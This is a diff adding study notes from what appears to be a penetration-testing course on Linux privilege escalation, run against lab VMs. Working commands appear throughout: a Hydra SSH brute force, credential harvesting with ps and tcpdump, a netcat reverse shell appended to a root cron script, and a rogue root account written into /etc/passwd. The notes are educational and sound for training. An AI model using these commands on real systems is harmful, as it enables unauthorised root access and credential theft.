+&lt;li&gt;Local user exec that bin with elevated priv.&lt;/li&gt;
+&lt;li&gt;When user or automate script launches SUID app.&lt;/li&gt;
+&lt;li&gt;It inherits the UID/GID of initiating script.&lt;/li&gt;
+&lt;li&gt;Known as the &lt;strong&gt;&amp;quot;effective UID/GID&amp;quot; or eUID/eGID&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Which is the user the OS verifies to grant perms for the action.&lt;/li&gt;
+&lt;li&gt;Manage to subvert a setuid root program to call a command of choice.&lt;/li&gt;
+&lt;li&gt;Effectively impersonate the root user.&lt;/li&gt;
+&lt;li&gt;Common method of PrivEsc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use &lt;code&gt;find&lt;/code&gt; to search for SUID-marked bins:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/&lt;/code&gt; search root.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-type f&lt;/code&gt; for files.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-perm -u=s&lt;/code&gt; with SUID bit set.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;2&amp;gt;/dev/null&lt;/code&gt; discard errors.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ find / -perm -u=s -type f 2&amp;gt;/dev/null
+/usr/bin/find
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/ntfs-3g
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/bwrap
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/mount
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We found server SUID bins.&lt;/li&gt;
+&lt;li&gt;Exploitation varies on several factors.&lt;/li&gt;
+&lt;li&gt;If &lt;code&gt;/bin/cp&lt;/code&gt; were SUID we could copy/overwrite sensitive files like &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A full list of Linux PrivEsc techniques can be found in a compendium by g0tmi1k as well as many other resources:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation&quot;&gt;G0tmi1k compendium&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md&quot;&gt;Swissky&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation&quot;&gt;Carlos Polop&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Automated Enumeration&lt;/h5&gt;
+&lt;p&gt;To obtain an initial baseline of the target, we can use &lt;code&gt;unix-privesc-check&lt;/code&gt; on UNIX derivatives like Linux.  This is pre installed on Kali and available at &lt;code&gt;/usr/bin/unix-privesc-check&lt;/code&gt;.  It performs a number of checks to find any sys misconfigs that can be leveraged for PrivEsc.  Run the script without any args to review the tool&amp;#39;s details.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ /usr/bin/unix-privesc-check              
+unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )
+
+Usage: unix-privesc-check { standard | detailed }
+
+&amp;quot;standard&amp;quot; mode: Speed-optimised check of lots of security settings.
+
+&amp;quot;detailed&amp;quot; mode: Same as standard mode, but also checks perms of open file
+                 handles and called files (e.g. parsed from shell scripts,
+                 linked .so files).  This mode is slow and prone to false 
+                 positives but might help you find more subtle flaws in 3rd
+                 party programs.
+
+This script checks file permissions and other settings that could allow
+local users to escalate privileges.
+
+Use of this script is only permitted on systems which you have been granted
+legal permission to perform a security assessment of.  Apart from this 
+condition the GPL v2 applies.
+
+Search the output for the word &amp;#39;WARNING&amp;#39;.  If you don&amp;#39;t see it then this
+script didn&amp;#39;t find any problems.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The script has two modes.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;standard&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Performs a speed optimized process and should reduce the number of false positives.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;detailed&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Also checks perms of open file handles and called files.  slow and prone to false positive, but may help to find subtle flaws in 3rd party programs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In this example we will transfer the script to the target and use &lt;code&gt;standard&lt;/code&gt; mode, redirect the output to a file called &lt;code&gt;output.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ bash unix-privesc-check standard &amp;gt; output.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The script performs numerous checks for permissions on common files.  The following excerpt reveals config files writable by normal users.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-############################################&quot;&gt;Checking for writable config files
+############################################
+    Checking if anyone except root can change /etc/passwd
+WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
+    Checking if anyone except root can change /etc/group
+    Checking if anyone except root can change /etc/fstab
+    Checking if anyone except root can change /etc/profile
+    Checking if anyone except root can change /etc/sudoers
+WARNING: /etc/sudoers is a critical config file. World write is set for /etc/sudoers
+    Checking if anyone except root can change /etc/shadow
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The output shows anyone can edit &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;This easily allows an attacker to PrivEsc or create accounts on the target.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There are many other tools worth studying, which have been actively developed and enhanced over years.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&quot;&gt;LinPeas&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;All of these tools perform many automated checks, but we should remember that every system is different, one-off system changes can be missed by automated tools.  It is always important to check for unique configs that can only be enumerated manually.&lt;/p&gt;
+&lt;h4&gt;Exposed Confidential Information 17.2&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand user history files.&lt;/li&gt;
+&lt;li&gt;Inspect user trails for credential harvesting.&lt;/li&gt;
+&lt;li&gt;Inspect system trails for credential harvesting.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Inspecting User Trails&lt;/h5&gt;
+&lt;p&gt;There are often time constraints during engagements, always focus efforts on low hanging fruit first.&lt;/p&gt;
+&lt;p&gt;The target&amp;#39;s user &lt;code&gt;history&lt;/code&gt; file often hold clear-text user activity that may include sensitive info, such as passwords or other auth details.&lt;/p&gt;
+&lt;p&gt;On Linux, applications frequently store user-specific config files and sub-dirs in the user home dir.  Often called &amp;quot;dotfiles&amp;quot;, they are prepended with a &amp;quot;.&amp;quot;, instructing the system not to display the files when listing with basic commands.&lt;/p&gt;
+&lt;p&gt;One example is the &lt;code&gt;.bashrc&lt;/code&gt;, which is executed on new terminal windows from existing login sessions or when a new shell instance is started.  Withing the script, env vars can be set when a new user shell is spawned.&lt;/p&gt;
+&lt;p&gt;Sys admins sometimes store creds in env vars to interact with custom scripts requiring auth.  If we review the env vars of our lab Vm we will notice an unusual env var:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ env
+...
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+SCRIPT_CREDENTIALS=lab
+USER=joe
+LC_TERMINAL_VERSION=3.4.16
+SHLVL=1
+XDG_SESSION_ID=35
+LC_CTYPE=UTF-8
+XDG_RUNTIME_DIR=/run/user/1000
+SSH_CLIENT=192.168.118.2 59808 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+MAIL=/var/mail/joe
+SSH_TTY=/dev/pts/1
+OLDPWD=/home/joe/.cache
+_=/usr/bin/env
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The &lt;code&gt;SCRIPT_CREDENTIAL&lt;/code&gt; var holds something resembling a password.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To confirm this is a permanent var, inspect the &lt;code&gt;.bashrc&lt;/code&gt; conf file.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat .bashrc | grep export
+export SCRIPT_CREDENTIALS=&amp;quot;lab&amp;quot;
+#export GCC_COLORS=&amp;#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The var holding the pass is exported when the user shell starts.
+&lt;em&gt;Storing a clear-text password inside an environment variable is not considered a secure best practice. To safely authenticate with an interactive script, it&amp;#39;s recommended to adopt public key authentication and protect private keys with passphrases.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;#39;s try to PrivEsc by directly entering the password we discovered.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ su - root
+Password: 
+root@debian-privesc:~# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Instead of going directly for the root account, we could try to access user &lt;code&gt;eve&lt;/code&gt; we previously discovered.  We can try building a custom dict from know passwords to attempt to brute force eve&amp;#39;s account.&lt;/p&gt;
+&lt;p&gt;We can generate the wordlist with the &lt;code&gt;crunch&lt;/code&gt; CLI tool.  Set min and max len to &lt;code&gt;6&lt;/code&gt; chars, specify pattern with &lt;code&gt;-t&lt;/code&gt;, then hard code the first 3 chars to &lt;code&gt;lab&lt;/code&gt;, followed by 3 digits.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ crunch 6 6 -t Lab%%% &amp;gt; wordlist  
+Crunch will now generate the following amount of data: 7000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 1000 
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ head wordlist                                     
+Lab000
+Lab001
+Lab002
+Lab003
+Lab004
+Lab005
+Lab006
+Lab007
+Lab008
+Lab009
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since the target runs an SSH server, we can attempt our attack with Hydra.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Username &lt;code&gt;-l&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Wordlist &lt;code&gt;-P&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Target IP.&lt;/li&gt;
+&lt;li&gt;Set target as &lt;code&gt;ssh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Verbose &lt;code&gt;-V&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ hydra -l eve -P wordlist 192.168.234.214 -t 4 ssh -V             
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-01 07:19:28
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
+[DATA] attacking ssh://192.168.234.214:22/
+...
+[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
+1 of 1 target successfully completed, 1 valid password found
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Hydra succeeds and we can login as &lt;code&gt;eve&lt;/code&gt; via SSH:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
+eve@192.168.234.214&amp;#39;s password: 
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Sep 30 05:16:08 2022 from 127.0.0.1
+eve@debian-privesc:~$ whoami
+eve
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can verify we are running as a priv user with &lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no eve@192.168.234.214
+eve@192.168.234.214&amp;#39;s password: 
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Sep 30 05:16:08 2022 from 127.0.0.1
+eve@debian-privesc:~$ whoami
+eve
+eve@debian-privesc:~$ sudo -l
+[sudo] password for eve: 
+Matching Defaults entries for eve on debian-privesc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User eve may run the following commands on debian-privesc:
+    (ALL : ALL) ALL
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since &lt;code&gt;eve&lt;/code&gt; is an admin user, we can run commands with elev priv.  We can elevate to root with &lt;code&gt;sudo -i&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;eve@debian-privesc:~$ sudo -i
+root@debian-privesc:~# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Inspecting Service Footprints&lt;/h5&gt;
+&lt;p&gt;System daemons are Linux services, spawned at boot, to perform specific tasks without user interaction.  Linux servers often start many daemons:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Secure Shell (SSH) access is often restricted to specific users; capturing keys or agent sockets from writable directories can unlock lateral pivots.&lt;/li&gt;
+&lt;li&gt;Web server.&lt;/li&gt;
+&lt;li&gt;Database configuration files frequently harbor production credentials; note file owners and permissions so defenders can tighten storage practices.&lt;/li&gt;
+&lt;li&gt;Etc.
+Sys admins often rely on custom daemons to automate tasks and often neglect security best-practices.  As part of enum, we inspect the behavior of running procs to hunt for anomalies the may lead to PrivEsc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Unlike Win, Linux sllows us to list info about higher-priv procs like those running in the root context.  We can enum all procs with &lt;code&gt;ps&lt;/code&gt; , refresh every second with &lt;code&gt;watch&lt;/code&gt;, and &lt;code&gt;grep&lt;/code&gt; for the word &amp;quot;pass&amp;quot;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ watch -n 1 &amp;quot;ps -aux | grep pass&amp;quot;
+...
+
+joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
+root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p &amp;#39;Lab123&amp;#39; ssh  -t eve@127.0.0.1 &amp;#39;sleep 5;exit&amp;#39;
+root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The admin has configured a sys daemon to conn to local sys with the &lt;code&gt;eve&lt;/code&gt; user creds in clear text.&lt;/li&gt;
+&lt;li&gt;The proc is running as root, but we can still inspect it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Another holistic angle we should consider, is if we have the ability to capture network traffic.  For CLI packet capture we can use &lt;code&gt;tcpdump&lt;/code&gt;, it requires admin priv as it operates on raw sockets.  It is not uncommon to find IT accounts have been given access to this tool for troubleshooting.&lt;/p&gt;
+&lt;p&gt;We can run &lt;code&gt;tcpdump&lt;/code&gt; as user &lt;code&gt;joe&lt;/code&gt; who has specific sudo perms to run it.  Let&amp;#39;s try to capture traffic on the loopback iface:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dump contents in ASCII with &lt;code&gt;-A&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Filter for &amp;quot;pass&amp;quot; with &lt;code&gt;grep&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep &amp;quot;pass&amp;quot;
+[sudo] password for joe: 
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
++...+...user:root,pass:lab -
++...+...user:root,pass:lab -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;After several seconds we get the root user pass in clear text!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Insecure File Permissions 17.3&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Abuse insecure cron jobs to escalate privileges.&lt;/li&gt;
+&lt;li&gt;Abuse insecure file permissions to escalate privileges.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Abusing Cron Jobs&lt;/h5&gt;
+&lt;p&gt;Insecure file perms can be leveraged for PrivEsc.  Assume we already gained access to a Linux target as an unpriv user.&lt;/p&gt;
+&lt;p&gt;To leverage, we must locate an exec file that allows us write access and runs at elev priv.  The cron time based job scheduler is a prime target.  Sys level cron jobs exec with root priv and sys admins often create scripts with insecure perms.&lt;/p&gt;
+&lt;p&gt;SSH into our example target VM1 as &lt;code&gt;joe&lt;/code&gt; user and check for installed cron jobs.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ crontab -l
+# Edit this file to introduce tasks to be run by cron.
+...
+# m h  dom mon dow   command
+
+joe@debian-privesc:~$ sudo crontab -l
+[sudo] password for joe: 
+...
+# m h  dom mon dow   command
+* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
+joe@debian-privesc:~$ grep &amp;quot;CRON&amp;quot; /var/log/syslog
+Nov  1 10:11:46 debian-privesc CRON[1226]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Nov  1 10:12:01 debian-privesc CRON[1280]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;A script &lt;code&gt;user_backup.sh&lt;/code&gt; under &lt;code&gt;/home/joe&lt;/code&gt; is exec in root context.&lt;/li&gt;
+&lt;li&gt;It appears to run every minute.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can inspect the contents of the script:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat .scripts/user_backups.sh 
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+joe@debian-privesc:~$ ls -lha .scripts/user_backups.sh 
+-rwxrwxrw- 1 root root 50 Aug 25  2022 .scripts/user_backups.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The script copies the user&amp;#39;s home dir to the backups subdir.&lt;/li&gt;
+&lt;li&gt;The perms show local users can write to the file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Since an unpriv user can modify the contents of the backup script, we can edit and add a reverse shell one-liner.  If it succeeds, we will receive a root priv rev shell on our attacking machine after one minute at most.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~/.scripts$ cat user_backups.sh 
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+
+joe@debian-privesc:~/.scripts$ echo &amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.45.182 4444 &amp;gt;/tmp/f&amp;quot; &amp;gt;&amp;gt; user_backups.sh 
+joe@debian-privesc:~/.scripts$ cat user_backups.sh 
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.45.182 4444 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Start the listener on our attacking machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.248.214] 35340
+/bin/sh: 0: can&amp;#39;t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As shown, the cron job executed our reverse shell one-liner and we achieve PrivEsc with a root shell on the target.&lt;/p&gt;
+&lt;h5&gt;Abusing Password Authentication&lt;/h5&gt;
+&lt;p&gt;Passwords are generally stored in &lt;code&gt;/etc/shadow&lt;/code&gt; (not readable by normal user) when there are no centralized credential systems, such as AD or LDAP, in use.  Historically, hashes and account info were stored in the world readable &lt;code&gt;/etc/passwd&lt;/code&gt;.  For backwards compatibility, if a password hash is present in the second column of an &lt;code&gt;/etc/passwd&lt;/code&gt; user record it is valid for auth and takes precedence over the entry in &lt;code&gt;/etc/shadow&lt;/code&gt; if present.  Therefore, if we can write into &lt;code&gt;/etc/passwd&lt;/code&gt; we can set an arbitrary password for any account.&lt;/p&gt;
+&lt;p&gt;Previously we have seen that the Debian Vm may be vulnerable to PrivEsc due to &lt;code&gt;/etc/passwd&lt;/code&gt; perms being improperly set.  We can PrivEsc by adding another superuser, &lt;code&gt;root2&lt;/code&gt;, and corresponding password hash to &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate password hash with &lt;code&gt;openssl&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Using arg &lt;code&gt;passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;If no other option is specified, the hash will be generated with &lt;a href=&quot;https://en.wikipedia.org/wiki/Crypt_(C)&quot;&gt;crypt algorithm&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;A supported hash for Linux auth.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;The output of the OpenSSL passwd command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;We then add the line to &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ openssl passwd w00t
+bAoT00dpc4dtE
+joe@debian-privesc:~$ echo &amp;quot;root2:bAoT00dpc4dtE:0:0:root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt; /etc/passwd
+joe@debian-privesc:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+eve:x:1001:1001:,,,:/home/eve:/bin/bash
+lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
+root2:bAoT00dpc4dtE:0:0:root:/root:/bin/bash
+
+joe@debian-privesc:~$ su root2
+Password: 
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As shown we have added &lt;code&gt;root2&lt;/code&gt; with password &lt;code&gt;w00t&lt;/code&gt; to &lt;code&gt;/etc/passwd&lt;/code&gt;.  We then use &lt;code&gt;su&lt;/code&gt; to switch to our new user and issue &lt;code&gt;id&lt;/code&gt; to show that we have gained root privs.&lt;/p&gt;
+&lt;p&gt;It may seem unlikely to find &lt;code&gt;/etc/passwd&lt;/code&gt; world-writeable, but there are many cases where security is compromised for usability.&lt;/p&gt;
+&lt;h4&gt;Insecure System Components 17.4&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Abuse SUID programs and capabilities for privilege escalation.&lt;/li&gt;
+&lt;li&gt;Circumvent special sudo permissions to escalate privileges.&lt;/li&gt;
+&lt;li&gt;Enumerate the system&amp;#39;s kernel for known vulnerabilities, then abuse them for privilege escalation.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Abusing Setuid Binaries and Capabilities&lt;/h5&gt;
+&lt;p&gt;As we saw earlier, &lt;code&gt;setuid&lt;/code&gt; binaries can lead to PrivEsc when not properly secured.  Before we attempt the exploit let&amp;#39;s review the purpose behind a setuid binary with an example.&lt;/p&gt;
+&lt;p&gt;When a user or a system-automated script launches a proc, it inherits the UID/GUID of the initiating script, known as the real UID/GID.&lt;/p&gt;
+&lt;p&gt;User password hashes within &lt;code&gt;/etc/shadow&lt;/code&gt;, owned by root (uid=0).  How can a non-priv user access the file to change their own password?  To circumvent, the effective UID/GID was introduced, representing the actual value that is checked when performing priv operations.&lt;/p&gt;
+&lt;p&gt;Let&amp;#39;s analyze the &lt;code&gt;passwd&lt;/code&gt; program, responsible for changing the password for the user who executes it.  On our Debian lab machine, we&amp;#39;ll connect as &lt;code&gt;joe&lt;/code&gt; and execute the &lt;code&gt;passwd&lt;/code&gt; command without typing anything afterwards (keeping the process in active memory).&lt;/p&gt;
